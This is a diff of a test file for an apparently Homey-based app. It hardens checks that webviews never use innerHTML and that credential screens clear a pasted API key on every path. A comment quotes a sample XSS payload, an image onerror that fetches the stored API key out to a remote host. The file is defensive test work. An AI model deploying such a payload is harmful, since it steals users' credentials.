@@ -2,6 +2,7 @@ import { test, describe } from 'node:test';
 import assert from 'node:assert/strict';
 import { readFileSync, readdirSync, existsSync } from 'node:fs';
 import { join } from 'node:path';
+import { runPairView } from '../support/pair-view-harness';
 
 /**
  * The two privileged webviews, and what may reach a HTML parser inside them.
@@ -18,8 +19,8 @@ import { join } from 'node:path';
  * A light named `"><img src=x onerror=fetch('…?k='+Homey.get('flowWriteApiKey'))>`
  * was one string concatenation away from working.
  *
- * So: no interpolated value passes through an HTML parser, with two allowlisted
- * exceptions named and argued below.
+ * So: no interpolated value passes through an HTML parser, and no view assigns
+ * `innerHTML` at all — the allowlist below is empty.
  */
 
 const ROOT = join(import.meta.dirname, '..', '..');
@@ -156,11 +157,14 @@ describe('no view reads the API key', () => {
     }
   });
 
-  test('the app API never returns it either', () => {
-    // The other half of the perimeter, asserted here so both halves are in one
-    // place. diagnostics-redaction.test.ts covers the log and diagnostics paths.
+  test('the app API never touches the write client either', () => {
+    // The other half of the perimeter. What the handlers RETURN is asserted
+    // behaviourally in api-orphans.test.ts ("the app API never returns the
+    // stored key"), against a real CredentialService holding one; this source
+    // check is kept because it says something that one cannot — that api.ts
+    // never holds the client a token could be echoed from.
+    // diagnostics-redaction.test.ts covers the log and diagnostics paths.
     const api = readFileSync(join(ROOT, 'api.ts'), 'utf8');
-    assert.equal(api.includes('flowWriteApiKey'), false);
     assert.equal(api.includes('getWriteClient'), false);
   });
 });
@@ -174,38 +178,58 @@ describe('no view reads the API key', () => {
  * it, so the plaintext key sat in an input there for the rest of the session —
  * while `settings/index.html` had always cleared its own field.
  *
- * Not a live vulnerability: every `innerHTML` site in the app escapes correctly,
- * which the tests above are about. It is the thing that perimeter exists to make
- * unnecessary, and the guard nearest it ("no view reads the API key") asserts
- * something adjacent — that no view MENTIONS the settings storage key — not this.
+ * Not a live vulnerability: no view assigns `innerHTML` at all, which the tests
+ * above are about, so no device name has a markup path to escape through. It is
+ * the thing that perimeter exists to make unnecessary, and the guard nearest it
+ * ("no view reads the API key") asserts something adjacent — that no view
+ * MENTIONS the settings storage key — not this.
+ *
+ * Driven through the pair-view harness rather than searched for: a regex for
+ * `field.value = ''` was satisfied by the line existing anywhere, reachable or
+ * not, and could not tell the success path from the failure path.
  */
 describe('the credential screens do not keep what was pasted into them', () => {
   const CREDENTIAL_VIEWS = ['controller/pair', 'controller/repair', 'schedule/pair', 'schedule/repair'];
 
-  test('every credential view clears its field', () => {
-    for (const view of CREDENTIAL_VIEWS) {
-      const source = readFileSync(
-        join(import.meta.dirname, '..', '..', 'drivers', ...view.split('/'), 'credential.html'),
-        'utf8',
-      );
-      assert.match(
-        source, /field\.value = ''/,
-        `drivers/${view}/credential.html never clears the pasted key`,
-      );
-    }
-  });
+  const KEY = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee:11111111-2222-3333-4444-555555555555:'
+    + '0123456789abcdef0123456789abcdef01234567';
 
-  test('it clears on the failure path too, not only on success', () => {
-    const source = readFileSync(
-      join(import.meta.dirname, '..', '..', 'drivers', 'controller', 'pair', 'credential.html'),
-      'utf8',
+  /** Boot a credential view with no key saved, paste one, press Save. */
+  async function pasteAndSave(view: string, reply: unknown) {
+    const run = runPairView(
+      readFileSync(join(ROOT, 'drivers', ...view.split('/'), 'credential.html'), 'utf8'),
+      { respond: { getCredentialStatus: { present: false, valid: false }, setCredential: reply } },
     );
-    // A refused key is still a key, and a refusal is the path a user retries
-    // from — so it is the one most likely to leave the field populated.
-    const afterEmit = source.slice(source.indexOf("emit('setCredential'"));
-    const inCatch = afterEmit.slice(afterEmit.indexOf('.catch('));
-    assert.match(inCatch, /forget\(\)/, 'the catch branch does not clear the field');
-  });
+    await run.settle();
+    assert.equal(run.error, null, `${view} threw: ${(run.error as Error)?.message}`);
+    const field = run.byId('cr-key')!;
+    field.value = KEY;
+    run.fire(run.byId('cr-save')!, 'click');
+    await run.settle();
+    const sent = run.emitted.find(e => e.event === 'setCredential');
+    assert.equal(sent?.data, KEY, `${view} never sent the pasted key, so this proves nothing`);
+    return { run, field };
+  }
+
+  for (const view of CREDENTIAL_VIEWS) {
+    test(`${view}: an accepted key does not stay in the field`, async () => {
+      const { run, field } = await pasteAndSave(view, { present: true, valid: true });
+      assert.equal(field.value, '');
+      assert.equal(run.shown.length, 1, 'an accepted key moves the flow on');
+    });
+
+    test(`${view}: a refused key does not stay in the field either`, async () => {
+      // A refused key is still a key, and a refusal is the path a user retries
+      // from — so it is the one most likely to leave the field populated.
+      const { field } = await pasteAndSave(view, { present: true, valid: false, failure: 'session_expired' });
+      assert.equal(field.value, '');
+    });
+
+    test(`${view}: nor does one whose check failed outright`, async () => {
+      const { field } = await pasteAndSave(view, new Error('Could not reach Homey'));
+      assert.equal(field.value, '');
+    });
+  }
 
   test('the settings page still clears its own, which is where the idea came from', () => {
     const source = readFileSync(
